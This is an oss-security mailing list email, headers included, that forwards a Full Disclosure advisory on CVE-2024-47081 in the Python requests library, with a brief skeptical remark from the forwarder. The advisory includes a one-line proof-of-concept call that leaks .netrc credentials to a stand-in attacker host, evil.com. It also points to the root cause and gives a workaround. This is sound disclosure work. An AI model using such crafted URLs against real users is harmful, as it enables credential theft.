Received: (qmail 30334 invoked by uid 550); 3 Jun 2025 17:10:07 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 30298 invoked from network); 3 Jun 2025 17:10:07 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oracle.com; h=
	content-transfer-encoding:content-type:date:from:in-reply-to
	:message-id:mime-version:references:subject:to; s=
	corp-2025-04-25; bh=C1MLySbQP00lQ/8DrWcLY0omeY0sqQ2y/mhpaxm65LE=; b=
	llK9+iG5rC3FYoNSVMUw+KjUY/cx7S8ABKVPesk2/1fFakGJTI5rqF6r0nIMPVUH
	7wGO0cMqU/HvNgrq+i/T0iUyiH8AXzKdRlZv60XVqmDwWKNIaDOGTdxAum48hniB
	IAPx/rT5sIizliYFUbvtG6ulVL6BsD9mHMSDps+2JgaX5Nd//emxN2kiQYo4dU6+
	JcqfKBr95CYeORGR6JK8ODnVeouz7gOtIPrr/QI2wSQkfKf7upjJ7MTjwsBtrAtT
	XsbDY38rtgY42fvj7SvZwYp3G5CBkdyufCkyTVs5gL9CVLo3hwRO4nRxWOI6O5k6
	behtZ/VemmtWbNfCkvjvUg==
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=r5KnUOM3VZBAEREkWelHCUsCWDic4tUbTloXQAxr7DFu7dZ47Zs0CPz6bjJKm1kGuKtDZ5PhL/1sxamylQSni6OfvkMqs0iKHrqQWGIG6KM9Iscmgyt44F4B0/QHuF/FfEiAOGcR/jIiHVUus2li1fdEPtkGO30qukkRW0LzO9c+/urawgoGLSZ84CiVrzgr9BCAcM5iXhTotAHi/aK99x2BUjpkcoukzuaX+8BuqzTr9VpkM18iaoyiCQpy1mwwykymS/k3d6DyTpLuXApHLFPRFvu1od/wPVxIzrID7uNFD/eTE3K+CyUecm/aRthBhRA9+HwG5ucOZfZ8lXlTkQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=C1MLySbQP00lQ/8DrWcLY0omeY0sqQ2y/mhpaxm65LE=;
 b=YE3UI/MCjtyw6TobxbI+BSdtOlAau972ulZ39obXd5CQZLLQc1+KjpqbDbgSjPuLposrzcIW0/Ajmrfjsga2HY3vRDfORl2bwX2rSznumWGetj1YyIK8HJZKiHHtk8CqlvlUnz5L3UAhY+gSMiar+AAcrw/7vMqoZ0uZiWPMiPvb6uW/bTGaDwhKHX3NMnOGPL8qlsyLYjgRbbof2CkxWBhDt72VGUq+JcCPs0ecwRFa95kXqiRMYZkB3r2NeO7MtSyB7M2lvqNVi70Nm1iFghwLVkZCfvpH47274ftQ8X2eVvo10ZIHJaOS87fAYvJQNJ758iUCSzarD8hiJajFgw==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=oracle.com; dmarc=pass action=none header.from=oracle.com;
 dkim=pass header.d=oracle.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=oracle.onmicrosoft.com; s=selector2-oracle-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=C1MLySbQP00lQ/8DrWcLY0omeY0sqQ2y/mhpaxm65LE=;
 b=Bf+9kPbZMlDFVw1G3VQfmE8xYlppsrCoWDQwPwKK/QJrED5erW0maf5lEWgLI5LSOJ/+nNdeOLHU0fMUis3hVpWqB0MsDT5+x+Oe0iytIL5K6zkn/qxfS6JfPdugODPK7aCbjNI6NkxQhnVzMI2j3rMqMOZUQk119tRvXPOssBQ=
Message-ID: <e93b9bb3-c2ac-4640-bd23-8b7d2ba1b3f8@oracle.com>
Date: Tue, 3 Jun 2025 10:09:52 -0700
User-Agent: Mozilla Thunderbird
References: <vXnhIIDfNauWIt5MizRQzyPhX--T3oCrKfPV4ixDc2J1W9iwF3zUR7g-9q1zz966EbG6Nf3Q5EX37ezTHJR_HgHXshROjRfXLDWl1AEInXA=@protonmail.ch>
Content-Language: en-US
From: Alan Coopersmith <alan.coopersmith@oracle.com>
To: oss-security@lists.openwall.com
Autocrypt: addr=alan.coopersmith@oracle.com; keydata=
 xsDiBEab+moRBACDH5yKqS3wcc5bdxY7PBNuwKvF5TKMfagmSvuRDtZjjIIWaA/nZ1KboV9G
 q5g7kP7+Kfu+Qgd8u65eVsWwmPW10fXvj3aCU53glx2EdGdrHcgiyH2gEQfPiyBw+trIppWF
 RV0IDXSLMA1FNC92t2nSG/VFHaPTVwcgkIRSfcXDvwCglGdEa6f4uLqoNHP+m4yYnzapFuMD
 /R4+2AJDAvEWKDdYCGZzlawjAmmWyXrmT7/C/mx98qUR473l4buXjHgDkkXXlHqdzil1vK85
 PhrKzNJDCCmlHUJNz+QwiAMOLwpD+kwVPb57RG7y+a5JQ5+jtVw4RlUxZIk/wj2An9YBO3A5
 vR7PdjM32ZJCN2+aM4dYfNzQxQKTA/47icvBaBVTl9rztjg2pd2Aqpc1P/GsIYLGj7XjnnJv
 GAENBHSH1QjpZMJGCTS9oJ+B0/wrIr+pA+MdFgYAb6ojMQJOO6UChjWWSGjMFcs/CeXhxlLB
 ido3DtAETbNTwO6OEfAvdosvTdhJFnwvZlJ+zZGGy5CrF2Fd9PUe9tmASc0uQWxhbiBDb29w
 ZXJzbWl0aCA8YWxhbi5jb29wZXJzbWl0aEBvcmFjbGUuY29tPsKCBBMRCgBCAhsDBgsJCAcD
 AgYVCAIJCgsEFgIDAQIeAQIXgAIZARYhBEoZPAbTXnxnD6TvC6L7nggfLRMOBQJkQs2eBQkn
 DNS0AAoJEKL7nggfLRMO1esAnR4FVD60BpDY/bJp5RC1VXhOVlo4AKCJgsQeVeGLxDlMuhAm
 bcCkOjafqc7BTQRGm/pvEAgAmnlpSWGjmtSGlLqKTuymwBAU9G7Jw8ow27QngXS/86g/PTzm
 yhXzK0uPgeoIaTZlqaHWNKCWJnC6T2btXtaDHH6cElrClYNf94os5sSt8PBDh184W+NtctAy
 Y2dA1pQYhYs8/eXwa4E4cyrrQG75M+CHrbu9Se0vlERARCpNcjNYLpTXRCwNuUvAi905VJ0Y
 XnGX83WbJfNIq+uxnBa2gVzwb2/2FwKOG03Wyb1vs6NznWJle9x61y8/LlEDoBRbfIQTFp51
 R0ue8gX2yMVgh8lYVViHYCBq+cat7p8X41Xa/fN/HfBFPsf3/+bhggNgmaBmDJBxxd6BPB8Y
 EireiwADBgf/UWIxQwwRLkiXPacOoh34MJYQIBTrCC8gVFxetlbEPEH5mueZMJegAPTF52l8
 6REenxdNVz/0xT7BD6VlHHY5DowlbRca4W8eb3gpkX/wfNYDYCHtTifT7ewumTrNZx5mrbNk
 0XTJVOPAP3z7E0rVD2w/xo4p22DzIwfeGKwpHqt1b6Z9fmrRDwaiXaFmwUf+rIiGc/OFcOSe
 46HwTmIyTOt6NVdQSf75jOPbdeM/n1I5svOdWTLEj6QEj2q9UQ98UEPJuMdaotyBFwKlcDOO
 LMSL793fWINrYSskdXhHjaht5wWqI+egO2JfciI/vP1+bEzhpY9llGq+r7WG3nCSf8JJBBgR
 AgAJBQJGm/pvAhsMAAoJEKL7nggfLRMOgugAoIdhGnD9d/IS6fDVgv+4xnOXvyohAJ0VVxc1
 uoPzepWFbgvLuHIMvyjRog==
In-Reply-To: <vXnhIIDfNauWIt5MizRQzyPhX--T3oCrKfPV4ixDc2J1W9iwF3zUR7g-9q1zz966EbG6Nf3Q5EX37ezTHJR_HgHXshROjRfXLDWl1AEInXA=@protonmail.ch>
X-Forwarded-Message-Id: <vXnhIIDfNauWIt5MizRQzyPhX--T3oCrKfPV4ixDc2J1W9iwF3zUR7g-9q1zz966EbG6Nf3Q5EX37ezTHJR_HgHXshROjRfXLDWl1AEInXA=@protonmail.ch>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit
X-ClientProxiedBy: SJ0PR03CA0012.namprd03.prod.outlook.com
 (2603:10b6:a03:33a::17) To DS7PR10MB5005.namprd10.prod.outlook.com
 (2603:10b6:5:3ac::15)
MIME-Version: 1.0
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: DS7PR10MB5005:EE_|CH3PR10MB6858:EE_
X-MS-Office365-Filtering-Correlation-Id: db91d232-7dac-4d14-b71f-08dda2c175be
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam: BCL:0;ARA:13230040|1800799024|376014|366016;
X-Microsoft-Antispam-Message-Info:
	=?utf-8?B?QlExVjBrdHVRc1VGTUNwNU1OdU9LWlZjSjZsd0Z3N0xJc1A2bkpuTHk0NHd2?=
 =?utf-8?B?cndnMzgrZmNzU2YxT2J2T3hTdVpDeCtwZ3huOTdhQnZaVVJrUFZWQllpTU5y?=
 =?utf-8?B?anZ3Tnp3WThwb2F6UmxXT2FBS1ZsZ29JUkNpdWg4Y2xBc0ZPQ2o1WENEcEs0?=
 =?utf-8?B?akRpL2lyTHIveHM4cDBMVVFJQ3lXOFhkMnZmR3FCT3FrWm5NNlY4ZXdmRTFR?=
 =?utf-8?B?ZG81eWxGU0h4MkRhWGZoNlRIQW9vMnJwZ3FiYlpvWjJpT28wbFB6WEVhRkVI?=
 =?utf-8?B?MXIrdi9sSCtvN2NhdWJ0Zm5pQVNnanhBc3ROUWxSeXc2RlNzbnBnWC9GMGdm?=
 =?utf-8?B?UzJPa21VdlFPZm55aHJmQTV6blRSV2tKZzIweno2OUh6MGV4dHJ0bDJzdzJk?=
 =?utf-8?B?WFUyOFJRbStTNFdSeXFwRk0vMEJGUnFmZ1FOL0tkcnZ1Sld3WTduQWVWS0Fm?=
 =?utf-8?B?QTZ0SnFQQVZPbFQ3L1RMWWRCenVlVktlTXBwb2pnUGxacUpVbHFJNG9FY1Jz?=
 =?utf-8?B?d0ZHSHM0STVqZ3F6aTF0UnQ0QytxUjdYZm5sT29MemJZV1ZkVHZzM2RZQXUv?=
 =?utf-8?B?MlMyQzlwTE5lRzJqMGJ4aUQ1UlpYbEVNKzlXUloxMGp0ak4xTXZGVk1peStG?=
 =?utf-8?B?UnMxTFZhUXRaZ0tWLzF5SStRZmNvWktlSkYwMHNKM1ZPdkgyOTFFSlV3Z0l3?=
 =?utf-8?B?UlFIcnlpS2RxOFZHb2E3QWtmc0lLQUJPRG0yUFo4NWtqTHVQZ2owakdHZm1h?=
 =?utf-8?B?NzNUMzNOZ2hRQXQyTEM4eTJJdG5tTXF6VkJVQ3U4Yk9VeDFOK0xMVXdkVjJY?=
 =?utf-8?B?RnhXSlJHNCtpQVdOZ0pERDFneThRYkxpWW1OWjJnSEViOGZyK3kwaFZ5QmFQ?=
 =?utf-8?B?QnlWd2xyWkJHMWwvWUNOL0lKa0UxcE9HcXBBbTY1a3JCS2NTdkUvUWxZQXBO?=
 =?utf-8?B?d2RpN29TWjJHME54aHZQcXZ4dWZVV09wQVArdGZYUllDQnBEVTNIUXBxcGNF?=
 =?utf-8?B?Sk9YVGlIa0tpWXRPQzZhQ2Y4d0R6eTZ3bklmZ1k4U1VWak1VOWc4KzZZRTZx?=
 =?utf-8?B?NjhYQXdKM2JyM1V4blNtaW5BSjh1ZmVFR3lSQVJUalB4V1ZMZDl5dDVXNjcw?=
 =?utf-8?B?c2pjMStIRDNkaFRMQlJxa2QwMlljSXBhVFY2K0xGT2NhSTNHR2NHaXZWRnEv?=
 =?utf-8?B?dEJhcHM1VDhCNkdMdVo0ZVRBT3VIdWxiU3VGVmdIOE5DeDNMWkFqUm44d3ZM?=
 =?utf-8?B?ZzRSS1ZUN1A0K3I1K0lnUVNHT1JVRVRUcmlWZ0NJYW5CZnBGbVJzaXIxanBN?=
 =?utf-8?B?QWIxLzdwSWUrRnUzWlQwbXVpM3ZkTTlKSEZTNm9uNGRpN1NIZUJDNDJ1N3I1?=
 =?utf-8?B?WGxOQ2pMMHVXWkN6UEY5UVY5NzFuMEJuWUNYeU9xeU5IR3hwSTBxWkQrbHJE?=
 =?utf-8?B?ZkxBTHo0UmhKbnU4d0FjQ2M1dlBlMzNXbkFCTWRnR2ZYbEt4TE1FNXE2Zk1C?=
 =?utf-8?B?ZXlZU3N0YjVEaVI2MGlUYmtQYThnNmhzSjd4R0NEd2R0UXpDV1YvallpWDZl?=
 =?utf-8?B?V0V6VXdJY1kzZEV6STIzRU1RQ2g3dmlGbm4yOVJQTDQyYy9mU2YvN2UzRFhq?=
 =?utf-8?B?S3dnWEpINE4rTGhNQXpoV2txU3ZRWTlvT3ByWlZMckVvR1RLUVZFblcxWDNP?=
 =?utf-8?B?aFpLWUFXcURTbVk1ZDcrVGZBa216UXhjZnYxSXhubWF5RHgram1HNW9CVGVH?=
 =?utf-8?B?SjFuTVRMMEFFYW96MzFYWldWZHdEZDVOTW1FdFc3N25tUUhWTm1wc1d6Szky?=
 =?utf-8?Q?xcI1ND4DDxFbiujoiVJ24++0t8pcfyo3vn0zQ=3D?=
X-Forefront-Antispam-Report:
	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:DS7PR10MB5005.namprd10.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(1800799024)(376014)(366016);DIR:OUT;SFP:1101;
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0:
	=?utf-8?B?S0tTTyttcUxuUG4xek44QnB6cjB4SmZWUHFReEhOellXR1Vqbm1POWpjZnFr?=
 =?utf-8?B?WEZENlQvelJyZzljUklycWxtSndsNmJONnNpUTNKcWhVR0FISkFXdVBRV01W?=
 =?utf-8?B?OUU4dytyazY5bS8rVTdnK05vZWg5aGZWV3QzMGp3Q2tSdDNJSzZqUVNjcUFh?=
 =?utf-8?B?TUdnQnBVOXFLc1VacTR4cFRmazRLVEJqdUkzcitIMDRxMHRGYXpibUszUmhw?=
 =?utf-8?B?WFgwSnVvTmFsRTE4Rnh0TW01dGNaV1JaQnRlZzJRcHBMdmJhWE9JbloybTc3?=
 =?utf-8?B?TGRISDBGSjV5ajExRDJuM3lncGFlRG9XZ3QwOEZ3NXVwenpKZHR2UmphODNL?=
 =?utf-8?B?T3VYRmVlcTJHUXkvLzYzbFhZQ2xRdUc0Z2xDSTZyUVdERHlJQXpiR285eVNW?=
 =?utf-8?B?aGtoeTNYU2g5aDBEdmxNVHE3RTBNdGN3Ykp6Z0pHMXVVWVZiU2dkSEdPcm9h?=
 =?utf-8?B?TGNBR2pBTEZQTDhxTS8rWHB4bDhxOFRCUjZFTnpkWXlUcDZqek44Rk5vU2NG?=
 =?utf-8?B?NmRoVWxPTmVEWUdRZkpGalJYY2RBUzgyT3B5VHkyT2luZVlrN3dZbWkwWUo5?=
 =?utf-8?B?SXBrWHBpYllPOTlydHFDUU9JT1FzcUdJNEFzQWZmUmFGZDkvMExTeUlGTW9I?=
 =?utf-8?B?RlVLeWRKQ1ZTbmFXM3BxSDkyMFQwODZ6cGQrR3liYnpLZEErV2piZmFHVnhF?=
 =?utf-8?B?TTQ3VmRyM1pRMnZBR2lEWkVabUNXSlVzcXlkWHEvSzZ1YURwY3A3TUE0eStX?=
 =?utf-8?B?bFNqWlozd3ZRbEtjT2VHdE9LcGpSSTA1WWR2VHl1bzRGRWw3dS9aRlNNNUR6?=
 =?utf-8?B?U1dqVklwc1hxVlN2VXdCUk1vMFdGelJyYlBlZmljakVDcmxyV0orRUVsN1ls?=
 =?utf-8?B?NUVJV0JUTURRdUwvTDlYcUlZMmh1RVk4eXQ1MmFTS25RTFR4bTVLeHBVNVU0?=
 =?utf-8?B?YXlSUE13Nk5sVm9LZXNCbXAwa2tWc2RNM2NGbTUvT2RraTF5S0Z2RlRFS3VF?=
 =?utf-8?B?emVHbnVjQU44d0xCK2cvRktmTjRaSUJBY3hUMjZvWFhwem1qWityWWtZWlU5?=
 =?utf-8?B?eUdOeUNRZ1J3dS9wSERJc0J0UlFKbFNuV0xyTURrcHd3TGgzNHZxV2F5dkhK?=
 =?utf-8?B?ZFp5Y1dJOGhCQUswQUNYeURPSHlldzdRV2ZYMGg3U0RhMFFEZWlTSE5mT0xp?=
 =?utf-8?B?ZFErbi91ODN3eGxUOUhHYTc4UlFaVHQ5anhUWit0dUNXVm1ncHp0ODRiY3R3?=
 =?utf-8?B?YWZtNDZKdHQ4OTlrcTM1T3N5STlrZGZRUFdQSnp4V3JrdjA5UTl4bVRweEdU?=
 =?utf-8?B?TXBtTlZldTFGdll1cWVNSkJDYkdraFNiUEJia1hIS09LZ1Y3bHRDQk00VkZJ?=
 =?utf-8?B?YUlHL3VWQlBIM09JeFFFMWVNUkFSOFA2UEt4RTBYRklwSEFxc0FrYXEvVSs0?=
 =?utf-8?B?dldIT1p4MjZhK3FjNUdWem4rNEhRS1FQdk5sc3N5aGdGZ1ZsdWppaUROWDR0?=
 =?utf-8?B?NU9YM0dqOG5welZDTXQ2NlJhMkV1OXkwMzJ6UUluSHRtaXZWUmNxY2w4VThO?=
 =?utf-8?B?TGtvQjFGREYzUitZWnI4M3RzeVlFMXRhNzR6NFdSeXNWbEN5YlpQditsNDBu?=
 =?utf-8?B?ankxZThoQ1d1NWNkamkyMUV1MjU2ZmNqYkRCSlBQZ3BGclFSUWtISDcveGJl?=
 =?utf-8?B?cUpESE4waVVuMFFTTFpKbEE3czB2Mkc5UjNuRXlVMXVIMGkrNW9ReHBIMVFF?=
 =?utf-8?B?MXc2a0FKTnQ1S3BIdzM4RW8xUEV2V2xhbTVmOUJqV1FhUnl6bk1VQ09Bdm9J?=
 =?utf-8?B?aDJsRTNxeFNRa1o4QmVxNUNDRUM3RGNNc3JKMFlWMldQcjhsalFRcXErVHE4?=
 =?utf-8?B?RVZ4cUdEUTEwM2hhTnhTV3lOZ3BzVEtWeXVkWC9iN0ZJc3V4TGVHTFhWY25R?=
 =?utf-8?B?U09sQnVheHgrRUFVcStLeGV0RldkYmRwWU5rYU1WbEZYZzE5SnlCNjl4VU1a?=
 =?utf-8?B?RE9FTjByanlmV0poMkZnS2Qwckl6aTlzaUdscmRhbnRTbnNaWDl6NEFTb3hY?=
 =?utf-8?B?anRPVWl2T0FUOWJVVVFIYWdqcGF0S3paa2dtZUJVenAvYWdnWUdWd0RneDVT?=
 =?utf-8?B?ZXN5VUFaZmVxUE80bmxBVEI1VFFNNVh5aE5BNHhoOFljSzFhN0paMGNyN1BK?=
 =?utf-8?B?c0E9PQ==?=
X-MS-Exchange-AntiSpam-ExternalHop-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-ExternalHop-MessageData-0:
	xeN14KXMlCBpmPJ5hy9EYbHkG3ciQ4AEL9WoJo9+cXv5fybdrkpQVATIpjKXHEGQz9WCpeW2JBm6k8+Mj4jBSWcwKDCX1+0g+6Pki+4oHyRoRalTP2Obla/5PotWvTs9iJ4kCaUFLa8IBAsrZfaMojg2e59WfosEpBMbz9THr76zfZAxf+bt3KJqpjkF97Vk5NNVIjBsnTp5klzQmrqwGavZ/T5TDIljOa4GnyuHa4Ka7TkxrUImzz85dPpBH0XX4kDWULNCKZo0FhmyB2GEDHojajgwXtAjzQIpgOGiu/0OLqCRPVfa3Fo4fCZvvmV47DrWnQLmKW/dTF2FmwqPD5nBOwhVF5O76V5USS6SKPdV9RBPMEoGgn9rRd5E/EzISv6YD4HDUv/gRMslwAQ0LjFNGCXVgc6HhckSkXyztGoJyhsQU0intFIYtlEZ8BeN0BCN/r44RgkJCp8BslaiKfw2DOaW9Dmha03S3WGNt5M09gvQEeViaMo4NPlU5ddKOEqaqw062XhSGks/DB4hBPm/plQ+On8xNU01ff+zAnNQNkts/WQwsgTAfjlRLFpX1Ax5v17FX8WddaPnm6cy7qrZkyBKjl1rFlx2pFCVykg=
X-OriginatorOrg: oracle.com
X-MS-Exchange-CrossTenant-Network-Message-Id: db91d232-7dac-4d14-b71f-08dda2c175be
X-MS-Exchange-CrossTenant-AuthSource: DS7PR10MB5005.namprd10.prod.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 03 Jun 2025 17:09:54.6556
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 4e2c6054-71cb-48f1-bd6c-3a9705aca71b
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: WBqGpISQLva/HbQh2ACCo/FwOiJUeVAjuoBgFIuiQzgIF6M4uXpfPSa2lOXs/V+pKEp6ArEjLYv+ugFdvfMHQqrujsNYAHxFhuzfDUkZEys=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: CH3PR10MB6858
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.293,Aquarius:18.0.1099,Hydra:6.0.736,FMLib:17.12.80.40
 definitions=2025-06-03_02,2025-06-02_01,2025-03-28_01
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0 adultscore=0 malwarescore=0
 phishscore=0 mlxscore=0 mlxlogscore=999 suspectscore=0 bulkscore=0
 classifier=spam adjust=0 reason=mlx scancount=1 engine=8.12.0-2505160000
 definitions=main-2506030149
X-Proofpoint-GUID: cMEAxOmlC2fmK2SxK-MAIRpSTp5vVzVU
X-Proofpoint-ORIG-GUID: cMEAxOmlC2fmK2SxK-MAIRpSTp5vVzVU
X-Proofpoint-Spam-Details-Enc: AW1haW4tMjUwNjAzMDE1MCBTYWx0ZWRfX0Pi3ykCCzyyJ tV86AczldefNmSa7zt20sj3h5sM6e4bp+/mYnLCx6YFwPyx6ayHoaeJ7kMEtmS0WuEuIhDPz7aV wdiTXjuSQdQC3gUzttzve0WtDh4uBCbR3hb+saPxrLjnxvJxlJswF/jixb+OHXB7/Ag/yH2tecL
 wfYc/l79Nei/Gc2/JDl1WTGA/DlwVsgnWr1HeNK697B1ygSZwCiTvncIKC/dLNQyyf5VSrCfXUL 9rSo77sbRCTw/1JGMsaJDgGmH+9ga2VFOBQxZpNf9K7gXiBrMG+mUSoT6Jmm8ZQN1kkvG/tx1AS aZV15YfG1GmzIi95ANK+CJD4xbrJLDR1LzKeBi83+zuDdpWbvF8uPPbvGzwihLVQ/YjtbrspbTS
 v1K6cl80Yt82/loBAUR+pgzIM94OHV9eCo/3r72VJMp4XIwOL0nzDB5eoEmj2vWwOgtO1BGs
X-Authority-Analysis: v=2.4 cv=QI1oRhLL c=1 sm=1 tr=0 ts=683f2c65 b=1 cx=c_pps a=zPCbziy225d3KhSqZt3L1A==:117 a=zPCbziy225d3KhSqZt3L1A==:17 a=6eWqkTHjU83fiwn7nKZWdM+Sl24=:19 a=lCpzRmAYbLLaTzLvsPZ7Mbvzbb8=:19 a=wKuvFiaSGQ0qltdbU6+NXLB8nM8=:19
 a=Ol13hO9ccFRV9qXi2t6ftBPywas=:19 a=xqWC_Br6kY4A:10 a=IkcTkHD0fZMA:10 a=6IFa9wvqVegA:10 a=GoEa3M9JfhUA:10 a=NEAV23lmAAAA:8 a=CckQENj0AAAA:8 a=fLVUkWqjAAAA:8 a=auHYCxwYAAAA:8 a=3L6Nh-GTAAAA:8 a=A1X0JdhQAAAA:8 a=fIMZVvRBU2tIU8d2mfIA:9 a=3ZKOabzyN94A:10
 a=QEXdDO2ut3YA:10 a=yP29yDhXvrXOTQxZJtvQ:22 a=67XU6oJk2Lrwzah0vfu5:22 a=izEBCtx8DkBWphcOf488:22 cc=ntf awl=host:13206
Subject: [oss-security] CVE-2024-47081: Netrc credential leak in PSF requests
 library

[I'm not sure how the attacker is supposed to get the victim to make a
  requests call using a URL the attacker controls, but that didn't stop
  them from getting a CVE issued for this. -alan- ]


-------- Forwarded Message --------
Subject: [FD] CVE-2024-47081: Netrc credential leak in PSF requests library
Date: Sat, 31 May 2025 06:30:50 +0000
From: Juho Forsén via Fulldisclosure <fulldisclosure@seclists.org>
Reply-To: Juho Forsén <jupenur@protonmail.ch>
To: fulldisclosure@seclists.org <fulldisclosure@seclists.org>

The PSF requests library (https://github.com/psf/requests & https://pypi.org/project/requests/) leaks .netrc credentials to third parties due to incorrect URL processing under specific conditions.

Issuing the following API call triggers the vulnerability:

   requests.get('http://example.com:@evil.com/')

Assuming .netrc credentials are configured for example.com, they are leaked to evil.com by the call.

The root cause is https://github.com/psf/requests/blob/c65c780849563c891f35ffc98d3198b71011c012/src/requests/utils.py#L240-L245

The vulnerability was originally reported to the library maintainers on September 12, 2024, but no fix is available. CVE-2024-47081 has been reserved by GitHub for this issue.

As a workaround, clients may explicitly specify the credentials used on every API call to disable .netrc access.
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
